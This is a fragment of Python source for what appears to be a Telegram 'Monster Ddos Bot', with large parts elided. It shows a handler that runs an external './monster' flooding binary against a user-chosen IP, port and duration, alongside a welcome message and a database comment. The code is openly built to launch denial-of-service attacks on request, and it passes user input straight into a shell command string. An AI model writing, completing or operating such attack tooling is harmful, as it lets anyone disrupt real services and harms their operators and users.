...
# Add username column if it doesn't exist Watermark: @Mk_ddos
...
def attack_thread(ip, port, attack_time, attack_id):
    try:
        ...
        command = f"./monster {ip} {port} {attack_time} 800"
...
# Command handlers Watermark: @Mk_ddos
...
def start(message):
    ...
    bot.send_message(message.chat.id, "👋𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙏𝙤 **Monster** 𝘿𝙙𝙤𝙨 𝘽𝙤𝙩🗿:", reply_markup=markup)
